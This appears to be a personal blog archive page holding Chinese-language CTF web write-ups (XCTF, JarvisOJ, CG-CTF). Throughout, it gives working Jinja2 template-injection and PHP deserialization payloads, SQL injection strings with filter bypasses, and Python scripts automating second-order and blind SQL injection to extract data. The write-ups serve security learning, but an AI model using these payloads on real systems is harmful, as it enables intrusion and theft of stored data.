<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>Rock&#39;s blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="Rock&#39;s blog">
<meta property="og:url" content="https://rock718.github.io.git/page/3/index.html">
<meta property="og:site_name" content="Rock&#39;s blog">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Rock">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Rock&#39;s blog" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link href="https://fonts.googleapis.com/css?family=Noto+Sans+KR:100,300,400,700&amp;subset=korean" rel="stylesheet">
  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 6.3.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <!--<div id="banner"></div>-->
  <div id="header-outer" class="outer">
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        <a href="/" id="main-nav-title" class="main-nav-link">Rock&#39;s blog</a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives/">Archives</a>
        
          <a class="main-nav-link" href="/about/">about</a>
        
      </nav>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main">
  
    <article id="post-xctf-web-wp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/30/xctf-web-wp/">xctf-web-wp</a>
    </h1>
  

        <a href="/2019/12/30/xctf-web-wp/" class="article-date">
  <time datetime="2019-12-30T03:04:32.000Z" itemprop="datePublished">2019-12-30</time>
</a>
      </header>
    
    <div class="article-entry-abstract" itemprop="articleBody">
      
        <!--<h1 id="X-CTF-WEB-题目解题思路"><a href="#X-CTF-WEB-题目解题思路" class="headerlink" title="X-CTF WEB 题目解题思路"></a>X-CTF WEB 题目解题思路</h1><h3 id="1-backup"><a href="#1-backup" class="headerlink" title="1.backup"></a>1.backup</h3><p>php备份文件格式<code>.php~</code>、<code>.php.bak</code>。</p>
<h3 id="2-Web-python-template-injection"><a href="#2-Web-python-template-injection" class="headerlink" title="2.Web_python_template_injection"></a>2.Web_python_template_injection</h3><p>检测是否存在注入。</p>
<pre><code>/&#123;&#123;2*2&#125;&#125;
</code></pre>
<p>发现2*2被计算为了4,说明存在注入。<br>尝试枚举当前目录下的文件。</p>
<pre><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')&#125;&#125;
</code></pre>
<p>再读取文件</p>
<pre><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()[40]('fl4g').read()&#125;&#125;
</code></pre>
<h3 id="3-shrine"><a href="#3-shrine" class="headerlink" title="3.shrine"></a>3.shrine</h3><p>题目给出了部分代码，整理如下：</p>
<pre><code>import flask
import os

app = flask.Flask(__name__)
app.config[&#39;FLAG&#39;] = os.environ.pop(&#39;FLAG&#39;)

@app.route(&#39;/&#39;)
def index():
    return open(__file__).read()

@app.route(&#39;/shrine/&lt;path:shrine&gt;&#39;)
def shrine(shrine):

    def safe_jinja(s):
        s = s.replace(&#39;(&#39;, &#39;&#39;).replace(&#39;)&#39;, &#39;&#39;)
        blacklist = [&#39;config&#39;, &#39;self&#39;]
        return &#39;&#39;.join([&#39;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#39;.format(c) for c in blacklist]) + s

    return flask.render_template_string(safe_jinja(shrine))

if __name__ == &#39;__main__&#39;:
    app.run(debug=True)
</code></pre>
<p>大概意思是题目将flag放在了<code>app.config[&#39;FLAG&#39;]</code>中，同时对<code>/shrine/</code>下的请求参数做了过滤。将<code>(</code>和<code>)</code>替换为空。也将config和self对应变量设为了None。</p>
<p>有以下两种wp：</p>
<p>1</p>
<pre><code>/shrine/&#123;&#123;get_flashed_messages.__globals__['current_app'].config['FLAG']&#125;&#125;
</code></pre>
<p>2</p>
<pre><code>/shrine/&#123;&#123;url_for.__globals__['current_app'].config['FLAG']&#125;&#125;
</code></pre>
<p>get_flashed_messages()和url_for()是flask框架中的函数。</p>
<p>get_flashed_messages()作用如下：</p>
<ul>
<li>设置:flash(‘aaa’)</li>
<li>取值：get_flashed_message()</li>
<li>假设在a页面操作出错，跳转到b页面，在b页面显示a页面的错误信息</li>
</ul>
<p>url_for()作用如下：</p>
<ul>
<li>给指定的函数构造 URL。</li>
<li>访问静态文件(CSS &#x2F; JavaScript 等)。</li>
</ul>
<h3 id="4-unfinish"><a href="#4-unfinish" class="headerlink" title="4.unfinish"></a>4.unfinish</h3><p>首先看到的是一个登录界面，猜测有注册界面。<br>扫描目录后，发现确实有注册界面。</p>
<p>尝试注册用户并登录，发现登录后会把用户名显示出来，没有其他特别的内容。</p>
<p>对注册时的三个参数进行特殊字符和关键字测试，发现用户名有些异常响应。</p>




<p>猜测用户名处存在注入，且可能为二次注入。<br>经测试，大概过滤了<code>,</code>和<code>information</code>。</p>
<p>可得到数据库名为<code>web</code>，但表名无法得到。查看参考答案后得知表名全靠猜。</p>
<p>最终的注入程序如下：</p>
<pre><code>import requests

baseURL = &quot;http://124.126.19.106:53212/&quot;
fObj = open(&quot;/root/Desktop/unfinish.txt&quot;,&quot;r&quot;)
regCount = int(fObj.read())
fObj.close()

try:
    for i in range(50):
        payload = &quot;0&#39;+ascii(substr((select * from flag) from &quot;+ str(i+1) +&quot; for 1))+&#39;0&quot;
        # 注册用户名
        regCount += 1
        parma = &#123;&quot;email&quot;:&quot;test&quot; + str(regCount) + &quot;@qq.com&quot;, &quot;username&quot;:payload, &quot;password&quot;:&quot;1111&quot;&#125;
        register = requests.post(baseURL+&quot;register.php&quot;, data=parma)
        # 登录
        parma = &#123;&quot;email&quot;:&quot;test&quot; + str(regCount) + &quot;@qq.com&quot;, &quot;password&quot;:&quot;1111&quot;&#125;
        login = requests.post(baseURL+&quot;login.php&quot;, data=parma)
        # print(login.text)
        username = login.text.split(&quot;&lt;span class=\&quot;user-name\&quot;&gt;&quot;)[1].split(&quot;&lt;/span&gt;&quot;)[0].strip()
        if username == &#39;0&#39;:
            break
        print(chr(int(username)), end=&#39;&#39;)
    print()
finally:
    fObj = open(&quot;/root/Desktop/unfinish.txt&quot;,&quot;w&quot;)
    fObj.write(str(regCount))
    fObj.close()
</code></pre>
<p><em><strong>unfinish.txt用来计数注册了多少个用户，因为该题目用户一旦注册，用户名就不能改变了，所以每次注册必须使用新邮箱。</strong></em></p>
<h3 id="未完待续……"><a href="#未完待续……" class="headerlink" title="未完待续……"></a>未完待续……</h3>-->
      
    </div>
    <footer class="article-footer">
      <!--<a data-url="https://rock718.github.io.git/2019/12/30/xctf-web-wp/" data-id="cl9y4cx9r005e24fyc5kt026n" class="article-share-link">Share</a>-->
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/xctf/" rel="tag">xctf</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-jarvisoj-web-wp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/24/jarvisoj-web-wp/">jarvisoj web 题目解答</a>
    </h1>
  

        <a href="/2019/12/24/jarvisoj-web-wp/" class="article-date">
  <time datetime="2019-12-24T12:30:19.000Z" itemprop="datePublished">2019-12-24</time>
</a>
      </header>
    
    <div class="article-entry-abstract" itemprop="articleBody">
      
        <!--<h2 id="1-PORT51"><a href="#1-PORT51" class="headerlink" title="1.PORT51"></a>1.PORT51</h2><p>题目要求使用51号端口访问该地址</p>
<pre><code>curl --local-port 51 http://web.jarvisoj.com:32770/
</code></pre>
<h2 id="2-LOCALHOST"><a href="#2-LOCALHOST" class="headerlink" title="2.LOCALHOST"></a>2.LOCALHOST</h2><p>题目提示只有localhost才能访问，故在请求头中添加：</p>
<pre><code>client-ip: 127.0.0.1
X-Forwarded-For: 127.0.0.1
</code></pre>
<p>成功获取到flag。</p>
<h2 id="3-Login"><a href="#3-Login" class="headerlink" title="3.Login"></a>3.Login</h2><p>burp抓取到响应头部隐藏提示：</p>
<pre><code>Hint: &quot;select * from `admin` where password=&#39;&quot;.md5($pass,true).&quot;&#39;&quot;
</code></pre>
<p><code>md5($pass,true)</code>说明返回的是将密码md5加密后的二进制数据。故需要我们找到令加密后数据可以构造出sql注入的明文数据，此处列举一些可行的payload：</p>
<pre><code>明文: 129581926211651571912466741651878684928
md5hex: 06da5430449f8f6f23dfc1276f722738
对应的字符串: ?T0D??o#??’or’8.N=?
明文: ffifdyop
md5hex: 276f722736c95d99e921722cf9ed621c
对应的字符串: ‘or’6蒥欓!r,b
</code></pre>
<p><em><strong>注：由于mysql在进行布尔类型的的比较时会将数字开头的字符串视为数字，所以可以使判断成立。</strong></em></p>
<h2 id="4-神盾局的秘密"><a href="#4-神盾局的秘密" class="headerlink" title="4.神盾局的秘密"></a>4.神盾局的秘密</h2><p>打开题目发现是一张图片，查看响应头部无特殊信息后，尝试分析图片，发现并无异常。查看网页源代码：</p>
<pre><code>&lt;img src=&quot;showimg.php?img=c2hpZWxkLmpwZw==&quot; width=&quot;100%&quot;/&gt;
</code></pre>
<p>看到这里<code>img</code>后的base64编码字符串，解码后为<code>shield.jpg</code>。猜测这里含有文件包含漏洞，且文件名以base64编码形式传入。<br>包含<code>showimg.php</code>，查看源码显示：</p>
<pre><code>&lt;?php
    $f = $_GET[&#39;img&#39;];
    if (!empty($f)) &#123;
        $f = base64_decode($f);
        if (stripos($f,&#39;..&#39;)===FALSE &amp;&amp; stripos($f,&#39;/&#39;)===FALSE &amp;&amp; stripos($f,&#39;\\&#39;)===FALSE
        &amp;&amp; stripos($f,&#39;pctf&#39;)===FALSE) &#123;
            readfile($f);
        &#125; else &#123;
            echo &quot;File not found!&quot;;
        &#125;
    &#125;
?&gt;
</code></pre>
<p>可以看到这里对<code>pctf</code>进行了过滤。<br>进一步尝试包含<code>index.php</code>：</p>
<pre><code>&lt;?php
    require_once(&#39;shield.php&#39;);
    $x = new Shield();
    isset($_GET[&#39;class&#39;]) &amp;&amp; $g = $_GET[&#39;class&#39;];
    if (!empty($g)) &#123;
        $x = unserialize($g);
    &#125;
    echo $x-&gt;readfile();
?&gt;
</code></pre>
<p>再包含<code>shield.php</code>：</p>
<pre><code>&lt;?php
    //flag is in pctf.php
    class Shield &#123;
        public $file;
        function __construct($filename = &#39;&#39;) &#123;
            $this -&gt; file = $filename;
        &#125;

        function readfile() &#123;
            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE
            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) &#123;
                return @file_get_contents($this-&gt;file);
            &#125;
        &#125;
    &#125;
?&gt;
</code></pre>
<p>由于<code>showimg.php</code>对<code>pctf</code>进行了过滤，所以我们不能简单地直接包含<code>pctf.php</code>,但是可以注意到<code>index.php</code>允许我们提交一个<code>class</code>参数，该参数可以被反序列化为<code>Shield()</code>对象，然后调用其<code>readfile()</code>方法。故我们需要做的是为<code>class</code>参数传入一个序列化后的<code>Shield()</code>对象，这样经过反序列化后再调用其<code>readfile()</code>方法，就可以正确读取<code>pctf.php</code>。<br>我们可以在本地搭建一个php环境，结合<code>shield.php</code>，输出序列化后的<code>Shield()</code>对象：</p>
<pre><code>&lt;?php
    class Shield &#123;
        public $file;
        function __construct($filename = &#39;&#39;) &#123;
            $this -&gt; file = $filename;
        &#125;

        function readfile() &#123;
            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&#39;..&#39;)===FALSE
            &amp;&amp; stripos($this-&gt;file,&#39;/&#39;)===FALSE &amp;&amp; stripos($this-&gt;file,&#39;\\&#39;)==FALSE) &#123;
                return @file_get_contents($this-&gt;file);
            &#125;
        &#125;
&#125;
$pctf = new Shield(&quot;pctf.php&quot;);
echo serialize($pctf);
?&gt;
</code></pre>
<p>运行的结果为：</p>
<pre><code>O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;
</code></pre>
<p>将该结果填入URL：</p>
<pre><code>/index.php?class=O:6:&quot;Shield&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;pctf.php&quot;;&#125;
</code></pre>
<p>得到flag。</p>
<h2 id="5-IN-A-Mess"><a href="#5-IN-A-Mess" class="headerlink" title="5.IN A Mess"></a>5.IN A Mess</h2><p>访问题目链接，查看源码，发现<code>index.phps</code>,访问。发现里面有php源码，尝试进行分析：</p>
<pre><code>&lt;?php
error_reporting(0);
echo &quot;&lt;!--index.phps--&gt;&quot;;

if(!$_GET[&#39;id&#39;])
&#123;
    header(&#39;Location: index.php?id=1&#39;);
    exit();
&#125;
$id=$_GET[&#39;id&#39;];
$a=$_GET[&#39;a&#39;];
$b=$_GET[&#39;b&#39;];
if(stripos($a,&#39;.&#39;))
&#123;
    echo &#39;Hahahahahaha&#39;;
    return ;
&#125;
$data = @file_get_contents($a,&#39;r&#39;);
if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)
&#123;
    require(&quot;flag.txt&quot;);
&#125;
else
&#123;
    print &quot;work harder!harder!harder!&quot;;
&#125;
?&gt;
</code></pre>
<p>程序接收了<code>id</code>、<code>a</code>、<code>b</code>三个参数。</p>
<ul>
<li><p><code>id</code>不为<code>0</code>且<code>id</code>和<code>0</code>比较后相等;</p>
</li>
<li><p><code>a</code>用来指定打开的文件名，并要求文件内容为<code>1112 is a nice lab!</code>;</p>
</li>
<li><p><code>b</code>的长度要大于5,且和<code>111</code>拼接后可以匹配<code>1114</code>,且<code>b</code>的第一个字符和<code>4</code>不相等;<br><code>id</code>可以利用php的弱类型比较来绕过。<code>a</code>可以使用<code>php:\\input</code>或<code>data:</code>伪协议来绕过。由于<code>eregi()</code>受<code>\x00</code>截断影响，所以<code>b</code>可以通过<code>\x00</code>截断绕过。<br>故可构造URL：</p>
<p>  &#x2F;index.php?id&#x3D;0e&amp;a&#x3D;php:&#x2F;&#x2F;input&amp;b&#x3D;%0044444</p>
</li>
</ul>
<p>数据部分添加：</p>
<pre><code>1112 is a nice lab!
</code></pre>
<p>页面返回以下字符串：</p>
<pre><code>&lt;!--index.phps--&gt; Come ON!!! &#123;/^HT2mCpcvOLf&#125;
</code></pre>
<p><code>/^HT2mCpcvOLf</code>像是一个目录，故尝试访问，经过一系列跳转后到达以下页面：</p>
<pre><code>http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1
</code></pre>
<p>看不出有其他异常点，由于含有参数<code>?id=1</code>，故尝试sql注入。发现输入<code>&#39;</code>时回显查询字符串，表名为<code>content</code>，确认考察sql注入。</p>
<p>1.判断注入类型为数字型注入</p>
<p>2.查明过滤字符和关键字，经过测试，发现过滤了<code>select</code>、<code>union</code>、<code>from</code>、<code>空格</code>，关键字使用双写、大小写绕过，<code>空格</code>使用&#x2F;<em>1</em>&#x2F;绕过。</p>
<p>3.通过union查询来获得<code>content</code>表的列名：</p>
<pre><code>?id=-1/*1*/uunionnIon/*1*/seunionleCT/*1*/1,2,group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74%23
</code></pre>
<p><em><strong>这里的表名被16进制编码，是因为直接写表名会报错，原因尚不明确。</strong></em></p>
<p>查询结果为：</p>
<pre><code>id,context,title
</code></pre>
<p>对<code>context</code>列进行查找：</p>
<pre><code>?id=-1/*1*/uunionnIon/*1*/seunionleCT/*1*/1,2,group_concat(context)/*1*/frofromm/*1*/content%23
</code></pre>
<p>查询结果即为flag。</p>
<h2 id="6-Simple-Injection"><a href="#6-Simple-Injection" class="headerlink" title="6.Simple Injection"></a>6.Simple Injection</h2><p>首先对网站进行目录扫描，未发现其他有价值的页面。着手对登录页面进行注入。</p>
<p>发现页面会提示用户名错误和密码错误，判断用户名和密码验证为分步进行。</p>
<p>测试常用用户名，发现合法用户名<code>admin</code>。</p>
<p>对该用户名进行注入，发现为字符型注入，且闭合符号为<code>&#39;</code>，<code>&#39;||1#</code>可顺利绕过用户名验证。</p>
<p>对此位置进行基于bool的盲注。</p>
<pre><code>#!/usr/bin/python3
# -- coding: utf-8 --

import requests
import urllib.parse

URL = &quot;http://web.jarvisoj.com:32787/login.php&quot;

# Fuzz
fObj = open(&quot;/root/Desktop/special_char.txt&quot;, &#39;r&#39;)

for word in fObj.readlines():
    word_ = word.strip()
    word = urllib.parse.unquote(word_)
    parma = &#123;&quot;username&quot;:&quot;&#39;||length(&#39;\\&quot;+ word +&quot;&#39;)=&quot;+ str(len(word)) +&quot;#&quot;, &quot;password&quot;:&quot;1&quot;&#125;
    post = requests.post(url=URL, data=parma)
    if post.text.find(&quot;密码错误&quot;) == -1:
        print(&quot;%s\tFiltered&quot; % word_)

fObj.close()

fObj = open(&quot;/root/Desktop/char_list.txt&quot;, &#39;r&#39;)
chrList = fObj.readlines()
fObj.close()

# query = &quot;(database())&quot;
# query = &quot;(select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1)&quot;
# query = &quot;(select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=&#39;admin&#39;/**/limit/**/2,1)&quot;
# id	username	password
query = &quot;(select/**/password/**/from/**/admin)&quot;

length = 0
for l in range(1,100):
    parma = &#123;&quot;username&quot;:&quot;&#39;||length(&quot;+ query +&quot;)=&quot;+ str(l) +&quot;#&quot;, &quot;password&quot;:&quot;1&quot;&#125;
    post = requests.post(url=URL, data=parma)
    if post.text.find(&quot;密码错误&quot;) != -1:
        length = l
        break
print(length)

for l in range(length):
    flag = False
    for ch in chrList:
        ch = ch.strip()
        parma = &#123;&quot;username&quot;:&quot;&#39;||substr(&quot;+ query +&quot;,&quot;+ str(l+1) +&quot;,1)=&#39;&quot;+ ch +&quot;&#39;#&quot;, &quot;password&quot;:&quot;1&quot;&#125;
        post = requests.post(url=URL, data=parma)
        if post.text.find(&quot;密码错误&quot;) != -1:
            print(ch, end=&#39;&#39;)
            flag = True
            break
    if not flag:
        print(&quot;*&quot;, end=&#39;&#39;)
print()
</code></pre>
<p><em><strong>心得：要先对注入点进行测试，判断过滤了哪些特殊字符和关键字，注意对特殊字符进行转义。</strong></em></p>
<h2 id="持续更新中……"><a href="#持续更新中……" class="headerlink" title="持续更新中……"></a>持续更新中……</h2>-->
      
    </div>
    <footer class="article-footer">
      <!--<a data-url="https://rock718.github.io.git/2019/12/24/jarvisoj-web-wp/" data-id="cl9y4cx9k001s24fye6a37ccz" class="article-share-link">Share</a>-->
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>

    </footer>
  </div>
  
</article>


  
    <article id="post-CG-CTF-wp" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/21/CG-CTF-wp/">CG-CTF_解题思路</a>
    </h1>
  

        <a href="/2019/12/21/CG-CTF-wp/" class="article-date">
  <time datetime="2019-12-21T14:30:49.000Z" itemprop="datePublished">2019-12-21</time>
</a>
      </header>
    
    <div class="article-entry-abstract" itemprop="articleBody">
      
        <!--<h1 id="一、Misc"><a href="#一、Misc" class="headerlink" title="一、Misc"></a>一、Misc</h1><h2 id="1-丘比龙De女神"><a href="#1-丘比龙De女神" class="headerlink" title="1.丘比龙De女神"></a>1.丘比龙De女神</h2><h3 id="gif图片中嵌套去掉头部的加密zip压缩包。"><a href="#gif图片中嵌套去掉头部的加密zip压缩包。" class="headerlink" title="gif图片中嵌套去掉头部的加密zip压缩包。"></a>gif图片中嵌套去掉头部的加密zip压缩包。</h3><h2 id="2-Remove-Boyfriend"><a href="#2-Remove-Boyfriend" class="headerlink" title="2.Remove Boyfriend"></a>2.Remove Boyfriend</h2><h3 id="流量分析中的导出两个py代码和jpg图片，将图片中的字符代入py代码执行，得出结果"><a href="#流量分析中的导出两个py代码和jpg图片，将图片中的字符代入py代码执行，得出结果" class="headerlink" title="流量分析中的导出两个py代码和jpg图片，将图片中的字符代入py代码执行，得出结果"></a>流量分析中的导出两个py代码和jpg图片，将图片中的字符代入py代码执行，得出结果</h3><h2 id="3-MD5"><a href="#3-MD5" class="headerlink" title="3.MD5"></a>3.MD5</h2><h3 id="通过py脚本中的hashlib库来生成md5值，通过re库来匹配给定md5值。注意md5的update-方法是不断将新的字符串拼接到之前的字符串后计算md5值，不是使用新字符串来计算md5值。"><a href="#通过py脚本中的hashlib库来生成md5值，通过re库来匹配给定md5值。注意md5的update-方法是不断将新的字符串拼接到之前的字符串后计算md5值，不是使用新字符串来计算md5值。" class="headerlink" title="通过py脚本中的hashlib库来生成md5值，通过re库来匹配给定md5值。注意md5的update()方法是不断将新的字符串拼接到之前的字符串后计算md5值，不是使用新字符串来计算md5值。"></a>通过py脚本中的hashlib库来生成md5值，通过re库来匹配给定md5值。<em><strong>注意md5的update()方法是不断将新的字符串拼接到之前的字符串后计算md5值，不是使用新字符串来计算md5值。</strong></em></h3><pre><code>import hashlib
import re

charList = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;
pattern = r&quot;e9032\w\w\wda\w\w\w08\w\w\w\w911513\w0\w\w\wa2&quot;
plainText1 = &quot;TASC&quot;
plainText2 = &quot;O3RJMV&quot;
plainText3 = &quot;WDJKX&quot;
plainText4 = &quot;ZM&quot;

for ch1 in charList:
    for ch2 in charList:
        for ch3 in charList:
            string = plainText1+ch1+plainText2+ch2+plainText3+ch3+plainText4
            md5 = hashlib.md5(string.encode()).hexdigest()
            if re.match(pattern, md5):
                print(md5)
                exit(0)
</code></pre>
<h1 id="二、Web"><a href="#二、Web" class="headerlink" title="二、Web"></a>二、Web</h1><h2 id="1-签到题"><a href="#1-签到题" class="headerlink" title="1.签到题"></a>1.签到题</h2><h3 id="右键查看源码"><a href="#右键查看源码" class="headerlink" title="右键查看源码"></a>右键查看源码</h3><h2 id="2-签到2"><a href="#2-签到2" class="headerlink" title="2.签到2"></a>2.签到2</h2><h3 id="修改输入框字符长度限制，成功提交口令zhimakaimen"><a href="#修改输入框字符长度限制，成功提交口令zhimakaimen" class="headerlink" title="修改输入框字符长度限制，成功提交口令zhimakaimen"></a>修改输入框字符长度限制，成功提交口令<code>zhimakaimen</code></h3><h2 id="3-md5-collision"><a href="#3-md5-collision" class="headerlink" title="3.md5 collision"></a>3.md5 collision</h2><p><a name="collision"></a></p>
<h3 id="本题利用php弱类型比较。php弱类型总结"><a href="#本题利用php弱类型比较。php弱类型总结" class="headerlink" title="本题利用php弱类型比较。php弱类型总结"></a>本题利用php弱类型比较。<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41617034/article/details/92796769">php弱类型总结</a></h3><h3 id="由于字符串在使用-作为比较符号时，字符串会被转换为数字，故不同的字符串只要转化为的数字的值相等，即可使判断成立。利用python写一个脚本即可找到这样的字符串。"><a href="#由于字符串在使用-作为比较符号时，字符串会被转换为数字，故不同的字符串只要转化为的数字的值相等，即可使判断成立。利用python写一个脚本即可找到这样的字符串。" class="headerlink" title="由于字符串在使用==作为比较符号时，字符串会被转换为数字，故不同的字符串只要转化为的数字的值相等，即可使判断成立。利用python写一个脚本即可找到这样的字符串。"></a>由于字符串在使用<code>==</code>作为比较符号时，字符串会被转换为数字，故不同的字符串只要转化为的数字的值相等，即可使判断成立。利用python写一个脚本即可找到这样的字符串。</h3><pre><code>import hashlib
import re
from itertools import permutations
import time

charList = &#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;
pattern = r&quot;^0e([0-9]&#123;30&#125;)&quot;

startTime = time.time()
for k in range(2,10):
    print(&quot;length=%d&quot; %(k),end=&quot;\t&quot;)
    for item in permutations(charList,k):
        item=&#39;&#39;.join(item)
        md5_value = hashlib.md5(item.encode()).hexdigest()
        if re.match(pattern,md5_value):
            print(item)
            print(md5_value)
            exit(0)
    print(&quot;Time used :%fs&quot; %(time.time()-startTime))
</code></pre>
<h2 id="4-这题不是WEB"><a href="#4-这题不是WEB" class="headerlink" title="4.这题不是WEB"></a>4.这题不是WEB</h2><h3 id="另存题目中的图片，用Stegsolve中的File-Formart分析。"><a href="#另存题目中的图片，用Stegsolve中的File-Formart分析。" class="headerlink" title="另存题目中的图片，用Stegsolve中的File Formart分析。"></a>另存题目中的图片，用<code>Stegsolve</code>中的<code>File Formart</code>分析。</h3><h2 id="5-文件包含"><a href="#5-文件包含" class="headerlink" title="5.文件包含"></a>5.文件包含</h2><h3 id="用php-filter-convert-base64-encode-resource-index-php即可解出。"><a href="#用php-filter-convert-base64-encode-resource-index-php即可解出。" class="headerlink" title="用php://filter/convert.base64-encode/resource=index.php即可解出。"></a>用<code>php://filter/convert.base64-encode/resource=index.php</code>即可解出。</h3><h2 id="6-AAencode"><a href="#6-AAencode" class="headerlink" title="6.AAencode"></a>6.AAencode</h2><h3 id="用burp抓取homura-cc-CGfiles-aaencode-txt把里面的内容放到AAEncode解码器中。"><a href="#用burp抓取homura-cc-CGfiles-aaencode-txt把里面的内容放到AAEncode解码器中。" class="headerlink" title="用burp抓取homura.cc/CGfiles/aaencode.txt把里面的内容放到AAEncode解码器中。"></a>用<code>burp</code>抓取<code>homura.cc/CGfiles/aaencode.txt</code>把里面的内容放到AAEncode解码器中。</h3><h2 id="7-单身二十年"><a href="#7-单身二十年" class="headerlink" title="7.单身二十年"></a>7.单身二十年</h2><h3 id="用burp抓取请求，发现页面从-web8-search-key-php通过-lt-script-gt-window-location-quot-no-key-is-here-forever-php-quot-lt-script-gt-跳转到了-web8-no-key-is-here-forever-php。flag隐藏在-web8-search-key-php中。"><a href="#用burp抓取请求，发现页面从-web8-search-key-php通过-lt-script-gt-window-location-quot-no-key-is-here-forever-php-quot-lt-script-gt-跳转到了-web8-no-key-is-here-forever-php。flag隐藏在-web8-search-key-php中。" class="headerlink" title="用burp抓取请求，发现页面从/web8/search_key.php通过&lt;script&gt;window.location=&quot;./no_key_is_here_forever.php&quot;; &lt;/script&gt;跳转到了/web8/no_key_is_here_forever.php。flag隐藏在/web8/search_key.php中。"></a>用<code>burp</code>抓取请求，发现页面从<code>/web8/search_key.php</code>通过<code>&lt;script&gt;window.location=&quot;./no_key_is_here_forever.php&quot;; &lt;/script&gt;</code>跳转到了<code>/web8/no_key_is_here_forever.php</code>。flag隐藏在<code>/web8/search_key.php</code>中。</h3><h2 id="8-单身一百年也没用"><a href="#8-单身一百年也没用" class="headerlink" title="8.单身一百年也没用"></a>8.单身一百年也没用</h2><h3 id="这里的flag隐藏在index-php的response的头部"><a href="#这里的flag隐藏在index-php的response的头部" class="headerlink" title="这里的flag隐藏在index.php的response的头部"></a>这里的flag隐藏在<code>index.php</code>的response的头部</h3><h2 id="9-php-decode"><a href="#9-php-decode" class="headerlink" title="9.php decode"></a>9.php decode</h2><h3 id="直接将给出的php代码运行，或是将编码的shell解码出来打印，都可以看到flag。"><a href="#直接将给出的php代码运行，或是将编码的shell解码出来打印，都可以看到flag。" class="headerlink" title="直接将给出的php代码运行，或是将编码的shell解码出来打印，都可以看到flag。"></a>直接将给出的php代码运行，或是将编码的shell解码出来打印，都可以看到flag。</h3><h2 id="10-COOKIE"><a href="#10-COOKIE" class="headerlink" title="10.COOKIE"></a>10.COOKIE</h2><h3 id="根据提示，用burp抓包，将cookie中的login-0改为login-1。"><a href="#根据提示，用burp抓包，将cookie中的login-0改为login-1。" class="headerlink" title="根据提示，用burp抓包，将cookie中的login=0改为login=1。"></a>根据提示，用burp抓包，将cookie中的<code>login=0</code>改为<code>login=1</code>。</h3><h2 id="11-MYSQL"><a href="#11-MYSQL" class="headerlink" title="11.MYSQL"></a>11.MYSQL</h2><h3 id="题目考察intval-函数，进行查询的-id被intval-转型，但是if语句中的判断条件是直接获取get请求，故尝试使用值大于1024小于1025的小数。"><a href="#题目考察intval-函数，进行查询的-id被intval-转型，但是if语句中的判断条件是直接获取get请求，故尝试使用值大于1024小于1025的小数。" class="headerlink" title="题目考察intval()函数，进行查询的$id被intval()转型，但是if语句中的判断条件是直接获取get请求，故尝试使用值大于1024小于1025的小数。"></a>题目考察<code>intval()</code>函数，进行查询的<code>$id</code>被<code>intval()</code>转型，但是if语句中的判断条件是直接获取get请求，故尝试使用值大于1024小于1025的小数。</h3><h2 id="12-x2F-x00"><a href="#12-x2F-x00" class="headerlink" title="12.&#x2F;x00"></a>12.&#x2F;x00</h2><h3 id="题目考察php中ereg-函数的-00截断漏洞，被匹配的字符串如果包含-00会被截断，后面的字符串不再参与匹配。需要构造"><a 